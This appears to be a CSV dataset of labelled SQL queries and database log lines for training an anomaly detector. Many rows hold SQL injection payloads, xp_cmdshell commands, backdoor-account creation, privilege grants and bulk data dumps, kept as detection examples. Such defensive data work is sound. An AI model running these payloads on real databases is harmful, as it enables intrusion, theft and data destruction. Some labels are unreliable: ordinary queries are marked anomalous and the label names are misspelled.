query log,status,label
SELECT * FROM users WHERE username = 'admin' OR '1'='1';,anomaly,0
SELECT id FROM accounts WHERE email = '' UNION SELECT password FROM users;,anomaly,0
SELECT * FROM products WHERE id = 10; DROP TABLE users;,anomaly,0
SELECT * FROM orders WHERE order_id = 105 OR 1=1 -- bypass,anomaly,0
SELECT * FROM customers WHERE name = 'a'/**/OR/**/1=1;,anomaly,0
SELECT * FROM login WHERE user='admin' AND pass='' OR ''='';,anomaly,0
SELECT * FROM users WHERE id = 5 UNION ALL SELECT credit_card FROM payments;,anomaly,0
SELECT * FROM logs WHERE msg LIKE '%'; EXEC xp_cmdshell('whoami');,anomaly,0
SELECT * FROM items WHERE category = 'x' OR sleep(5);,anomaly,0
"SELECT * FROM data WHERE id = 1 OR benchmark(1000000,MD5(1));",anomaly,0
SELECT * FROM users WHERE username='admin' AND password='admin';,anomaly,0
SELECT * FROM users WHERE username='root' AND password='123456';,anomaly,0
SELECT * FROM users WHERE username='test' AND password='test';,anomaly,0
SELECT * FROM users WHERE username='admin' AND password LIKE '%';,anomaly,0
SELECT * FROM users WHERE username='administrator';,anomaly,0
SELECT * FROM users WHERE email='admin@localhost';,anomaly,0
SELECT * FROM users WHERE username='root' LIMIT 1;,anomaly,0
SELECT * FROM users WHERE username='admin' AND password='password';,anomaly,0
SELECT * FROM users WHERE username='sys';,anomaly,0
SELECT * FROM users WHERE username='admin' AND LENGTH(password)<8;,anomaly,0
GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%';,anomaly,0
CREATE USER 'backdoor'@'%' IDENTIFIED BY '1234';,anomaly,0
SET GLOBAL general_log = 'ON';,anomaly,0
UPDATE users SET role='admin' WHERE username='guest';,anomaly,0
ALTER USER 'app'@'%' IDENTIFIED BY 'weakpass';,anomaly,0
"INSERT INTO users(username,role) VALUES('hidden_admin','admin');",anomaly,0
SET PASSWORD FOR 'root'@'localhost' = PASSWORD('newpass');,anomaly,0
DROP USER 'audit'@'localhost';,anomaly,0
ALTER TABLE users ADD COLUMN is_superuser BOOLEAN DEFAULT TRUE;,anomaly,0
CREATE EVENT backdoor_event ON SCHEDULE EVERY 1 DAY DO UPDATE users SET role='admin';,anomaly,0
SELECT credit_card FROM payments;,anomaly,0
SELECT ssn FROM employees;,anomaly,0
SELECT password FROM users;,anomaly,0
SELECT api_key FROM system_config;,anomaly,0
SELECT private_key FROM certificates;,anomaly,0
SELECT medical_record FROM patients;,anomaly,0
SELECT salary FROM payroll;,anomaly,0
SELECT secret_token FROM auth_tokens;,anomaly,0
SELECT encryption_key FROM key_store;,anomaly,0
SELECT personal_id FROM customers;,anomaly,0
SELECT * FROM users INTO OUTFILE '/tmp/users.csv';,anomaly,0
SELECT * FROM payments INTO OUTFILE '/var/www/html/payments.txt';,anomaly,0
SELECT * FROM orders INTO OUTFILE '/home/mysql/orders.dump';,anomaly,0
SELECT * FROM customers INTO OUTFILE '/tmp/data_leak.csv';,anomaly,0
SELECT * FROM audit_logs INTO OUTFILE '/backup/logs.txt';,anomaly,0
SELECT * FROM employees INTO OUTFILE '/shared/hr.csv';,anomaly,0
SELECT * FROM transactions INTO OUTFILE '/tmp/tx_all.csv';,anomaly,0
SELECT * FROM users INTO OUTFILE '/export/users_all.csv';,anomaly,0
SELECT * FROM accounts INTO OUTFILE '/tmp/accounts.dump';,anomaly,0
SELECT * FROM secrets INTO OUTFILE '/tmp/secrets.txt';,anomaly,0
UPDATE accounts SET balance=0;,anomaly,0
DELETE FROM transactions;,anomaly,0
UPDATE orders SET total_amount=1;,anomaly,0
DELETE FROM audit_logs WHERE 1=1;,anomaly,0
UPDATE users SET email=NULL;,anomaly,0
TRUNCATE TABLE payments;,anomaly,0
UPDATE inventory SET stock=999999;,anomaly,0
DELETE FROM logs WHERE created_at < NOW();,anomaly,0
UPDATE customers SET name='unknown';,anomaly,0
ALTER TABLE orders DROP COLUMN total_amount;,anomaly,0
"SELECT * FROM users u, users u2, users u3;",anomaly,0
SELECT sleep(30);,anomaly,0
"SELECT benchmark(5000000, SHA1('x'));",anomaly,0
SELECT * FROM logs ORDER BY RAND();,anomaly,0
"SELECT COUNT(*) FROM large_table t1, large_table t2;",anomaly,0
SELECT * FROM data WHERE MATCH(content) AGAINST('*');,anomaly,0
SELECT * FROM records WHERE id IN (SELECT id FROM records);,anomaly,0
SELECT * FROM users LIMIT 999999999;,anomaly,0
SELECT * FROM huge_table;,anomaly,0
SELECT * FROM events WHERE timestamp BETWEEN '1900-01-01' AND '2100-01-01';,anomaly,0
SELECT * FROM orders WHERE YEAR(created_at)=2020;,anomaly,0
SELECT * FROM users WHERE LOWER(email)='test@test.com';,anomaly,0
SELECT * FROM logs WHERE message LIKE '%error%';,anomaly,0
SELECT * FROM transactions ORDER BY created_at;,anomaly,0
SELECT * FROM payments WHERE amount+1 > 100;,anomaly,0
"SELECT * FROM customers WHERE SUBSTRING(name,1,1)='A';",anomaly,0
SELECT * FROM products WHERE price*2 > 100;,anomaly,0
SELECT * FROM sessions WHERE DATE(last_seen)=CURDATE();,anomaly,0
SELECT * FROM orders WHERE status!='completed';,anomaly,0
SELECT * FROM users WHERE LENGTH(username)>5;,anomaly,0
ALTER TABLE users DROP PRIMARY KEY;,anomaly,0
ALTER TABLE orders MODIFY total_amount VARCHAR(10);,anomaly,0
DROP INDEX idx_email ON users;,anomaly,0
SET GLOBAL max_connections=100000;,anomaly,0
ALTER TABLE payments ENGINE=MyISAM;,anomaly,0
RENAME TABLE users TO users_backup;,anomaly,0
ALTER TABLE logs DISABLE KEYS;,anomaly,0
SET sql_mode='';,anomaly,0
ALTER TABLE customers DROP COLUMN email;,anomaly,0
SET GLOBAL event_scheduler=ON;,anomaly,0
INSERT INTO transactions(amount) VALUES(-99999);,anomaly,0
UPDATE accounts SET balance=balance+1000000;,anomaly,0
"INSERT INTO payments(amount,status) VALUES(0,'completed');",anomaly,0
UPDATE invoices SET paid=1 WHERE total_amount=0;,anomaly,0
INSERT INTO refunds(amount) VALUES(999999);,anomaly,0
UPDATE wallet SET balance=balance*10;,anomaly,0
INSERT INTO orders(total_amount) VALUES(1);,anomaly,0
UPDATE transactions SET fee=0;,anomaly,0
"INSERT INTO payments(amount,currency) VALUES(100000,'BTC');",anomaly,0
UPDATE accounts SET balance=NULL;,anomaly,0
UPDATE orders SET status='completed' WHERE status='pending';,anomaly,0
INSERT INTO users(role) VALUES('admin');,anomaly,0
UPDATE users SET verified=1;,anomaly,0
DELETE FROM approval_queue;,anomaly,0
INSERT INTO access_logs(user_id) VALUES(1);,anomaly,0
UPDATE subscriptions SET active=1;,anomaly,0
INSERT INTO coupons(discount) VALUES(100);,anomaly,0
UPDATE products SET price=1;,anomaly,0
DELETE FROM rate_limit;,anomaly,0
UPDATE users SET two_factor_enabled=0;,anomaly,0
SELECT * FROM users WHERE username='john_doe';,normaly,1
"INSERT INTO users(username,email) VALUES('alice','alice@mail.com');",normaly,1
UPDATE users SET last_login=NOW() WHERE id=10;,normaly,1
"SELECT order_id,total_amount FROM orders WHERE user_id=5;",normaly,1
"INSERT INTO orders(user_id,total_amount) VALUES(5,250.00);",normaly,1
SELECT COUNT(*) FROM transactions WHERE created_at >= CURDATE();,normaly,1
UPDATE inventory SET stock=stock-1 WHERE product_id=20;,normaly,1
SELECT * FROM products WHERE category='electronics' LIMIT 20;,normaly,1
"INSERT INTO audit_logs(action,user_id) VALUES('login',5);",normaly,1
SELECT email FROM users WHERE id=3;,normaly,1
UPDATE payments SET status='completed' WHERE payment_id=101;,normaly,1
SELECT * FROM invoices WHERE status='pending';,normaly,1
"INSERT INTO refunds(order_id,amount) VALUES(10,50.00);",normaly,1
SELECT * FROM customers WHERE country='TH';,normaly,1
UPDATE users SET password_hash='hashvalue' WHERE id=7;,normaly,1
SELECT * FROM logs WHERE created_at >= NOW() - INTERVAL 1 DAY;,normaly,1
"INSERT INTO sessions(user_id,created_at) VALUES(8,NOW());",normaly,1
SELECT SUM(amount) FROM payments WHERE status='completed';,normaly,1
UPDATE subscriptions SET renewed_at=NOW() WHERE user_id=9;,normaly,1
SELECT * FROM products ORDER BY created_at DESC LIMIT 10;,normaly,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --,anormaly,0
UPDATE accounts SET balance = 999999 WHERE user_id = 123; DROP TABLE logs;--,anormaly,0
" UNION SELECT credit_card, cvv FROM payment_info--",anormaly,0
"""; EXEC xp_cmdshell('net user hacker P@ss123 /add')--",anormaly,0
username=test'; WAITFOR DELAY '00:00:10'--,anormaly,0
SELECT password FROM admin WHERE id = (SELECT SLEEP(10))--,anormaly,0
 AND (SELECT COUNT(*) FROM sysobjects) > 0--,anormaly,0
%27+OR+1%3D1%23,anormaly,0
"admin' AND 1=CONVERT(int, (SELECT @@version))--",anormaly,0
; INSERT INTO logs (msg) VALUES ('backdoor_installed')--,anormaly,0
SELECT * FROM users WHERE username = 'john.doe',normaly,1
"SELECT product_id, name FROM catalog WHERE category = 'electronics'",normaly,1
"INSERT INTO user_sessions (user_id, token) VALUES (456, 'a1b2c3d4')",normaly,1
DELETE FROM temp_cache WHERE created_at < '2026-01-05',normaly,1
UPDATE profile SET last_login = '2026-01-06 10:00:00' WHERE user_id = 789,normaly,1
SELECT order_id FROM orders WHERE customer_email = 'user@example.com',normaly,1
SELECT COUNT(*) FROM failed_logins WHERE ip = '192.168.1.100',normaly,1
"INSERT INTO audit_log (event, user) VALUES ('login_success', 'alice')",normaly,1
SELECT balance FROM accounts WHERE account_number = 'ACC-8899',normaly,1
SELECT version() FROM dual,normaly,1
"Failed login: user='admin', password='password123' (IP: 203.0.113.45)",anormaly,0
Brute-force detected: 50 failed logins for 'root' in 2 mins,anormaly,0
Login attempt with empty password from 198.51.100.22,anormaly,0
User 'guest' trying password '123456789' – blocked by WAF,anormaly,0
"Multiple logins with common passwords: 'qwerty', 'letmein', 'admin'",anormaly,0
Credential stuffing: reused password from breach detected,anormaly,0
Login from Tor exit node (IP: 192.0.2.88) for user 'ceo',anormaly,0
Password spray: same password 'Winter2025!' tried on 100 accounts,anormaly,0
SQL Auth: sa login with weak password 'sa123',anormaly,0
LDAP bind attempt with null credentials,anormaly,0
"Successful login: user='j.smith', IP='203.0.113.10'",normaly,1
Password change request for user 'emma' – OTP verified,normaly,1
MFA enabled for user 'david',normaly,1
"Login from known device (Chrome, Windows) for user 'anna'",normaly,1
Session timeout after 30 min inactivity,normaly,1
User 'mike' logged in via SSO (Okta),normaly,1
New device login approved via email for user 'lisa',normaly,1
Password reset initiated – email sent to user@example.com,normaly,1
Auto-logout after 15 min idle time,normaly,1
User 'tom' accessed profile settings,normaly,1
User 'webapp' granted DBA role unexpectedly,anormaly,0
New stored procedure 'xp_backdoor' created in master DB,anormaly,0
ALTER USER sa WITH PASSWORD = 'new_backdoor_pass',anormaly,0
Linked server created to external IP 94.131.xx.xx,anormaly,0
SQL Agent job added: 'daily_cleanup' – executes powershell script,anormaly,0
TRIGGER created on sys.tables – suspicious,anormaly,0
User added to 'sysadmin' fixed server role by non-admin,anormaly,0
Encrypted payload in comment field of table 'temp_data',anormaly,0
"EXEC sp_addsrvrolemember 'hacker', 'sysadmin'",anormaly,0
Custom CLR assembly loaded – unsigned,anormaly,0
DB role 'report_reader' granted to user 'analyst',normaly,1
Stored procedure 'sp_generate_report' updated by DBA,normaly,1
Password rotated for service account 'app_svc',normaly,1
Linked server to reporting DB (internal IP 10.10.20.5),normaly,1
SQL Agent job 'weekly_backup' scheduled by admin,normaly,1
Audit trigger added to track changes on 'orders' table,normaly,1
User 'dev_team' added to 'db_datareader' on dev DB,normaly,1
Comment added: 'Fix for bug #1234' in migration script,normaly,1
sp_addrolemember used to add user to 'db_owner' (by DBA),normaly,1
Signed CLR assembly for data hashing deployed,normaly,1
"User 'intern' queried 10,000 rows from 'employee_ssn' table",anormaly,0
SELECT * FROM credit_cards WHERE 1=1,anormaly,0
Export of full customer PII table by non-HR user,anormaly,0
Accessed healthcare records of CEO by support agent,anormaly,0
Downloaded all user emails and phone numbers in one query,anormaly,0
SELECT password_hash FROM auth_table WHERE user_id > 0,anormaly,0
Queried 'salary' table from HR schema by finance user,anormaly,0
Accessed 500 passport numbers in 5 minutes,anormaly,0
SELECT * FROM internal.patients WHERE diagnosis = 'HIV',anormaly,0
User 'tester' ran query: SELECT api_keys FROM config,anormaly,0
User 'hr_manager' exported 3 employee records for onboarding,normaly,1
SELECT email FROM users WHERE last_login > '2026-01-01',normaly,1
Report generated: active customer count (no PII),normaly,1
Accessed own medical record via patient portal,normaly,1
"SELECT order_id, status FROM orders WHERE user_id = 123",normaly,1
Password reset token generated – hash not exposed,normaly,1
Finance user queried 'budget' table (non-sensitive),normaly,1
Exported 10 product SKUs for marketing campaign,normaly,1
SELECT COUNT(*) FROM patients WHERE doctor_id = 45,normaly,1
Dev user tested API key rotation – used dummy key,normaly,1
"Exported 500,000 rows to CSV at 3 AM (user: dev1)",anormaly,0
SQL dump of entire 'users' table initiated via web interface,anormaly,0
SELECT * INTO OUTFILE '/tmp/dump.csv' FROM secrets,anormaly,0
Bulk export to S3 from internal DB – no approval ticket,anormaly,0
Data copied to external USB drive (detected via endpoint log),anormaly,0
mysqldump executed by non-DBA user,anormaly,0
SELECT * FROM customers; results sent via email attachment,anormaly,0
Daily report size spiked from 2KB to 200MB,anormaly,0
Encrypted ZIP of DB backup uploaded to personal Dropbox,anormaly,0
PowerShell script exported all tables to JSON,anormaly,0
Scheduled export: daily sales summary (200 rows),normaly,1
DBA performed weekly backup via mysqldump (approved),normaly,1
SELECT * FROM logs WHERE date = '2026-01-05' (debugging),normaly,1
Exported user list for email campaign (opt-in only),normaly,1
Data export to BI tool (Tableau) – normal pipeline,normaly,1
CSV generated for finance reconciliation (50 rows),normaly,1
Report emailed to manager – encrypted with company key,normaly,1
Temp export for data migration test (approved),normaly,1
SELECT COUNT(*) FROM transactions (monitoring),normaly,1
Archived old orders to cold storage (automated job),normaly,1
UPDATE users SET is_admin = 1 WHERE username = 'hacker',anormaly,0
DELETE FROM audit_logs WHERE event_date > '2026-01-01',anormaly,0
SET IDENTITY_INSERT ON; INSERT INTO transactions...,anormaly,0
TRUNCATE TABLE customer_feedback,anormaly,0
ALTER TABLE orders DROP COLUMN payment_status,anormaly,0
UPDATE salary SET amount = amount * 10 WHERE emp_id = 123,anormaly,0
Injected fake transactions totaling $1M,anormaly,0
Changed user role from 'user' to 'superadmin',anormaly,0
Deleted all records from 'compliance_logs',anormaly,0
Overwrote config table with malicious redirect URL,anormaly,0
UPDATE user_profile SET phone = '+1234567890' WHERE user_id = 456,normaly,1
DELETE FROM sessions WHERE expired = 1,normaly,1
INSERT INTO logs (event) VALUES ('system_maintenance'),normaly,1
TRUNCATE TABLE temp_import_staging (daily cleanup),normaly,1
"ALTER TABLE products ADD COLUMN weight_kg DECIMAL(5,2)",normaly,1
UPDATE inventory SET stock = stock - 2 WHERE sku = 'ABC123',normaly,1
Reversed test transaction #T-9999,normaly,1
Promoted user 'jane' to 'manager' role (HR approved),normaly,1
Deleted old temp files from 'upload_cache',normaly,1
Updated config: homepage_url = 'https://new.example.com',normaly,1
"Query: SELECT REPLICATE('A', 1000000) FROM users – caused OOM",anormaly,0
1000 concurrent connections from single IP,anormaly,0
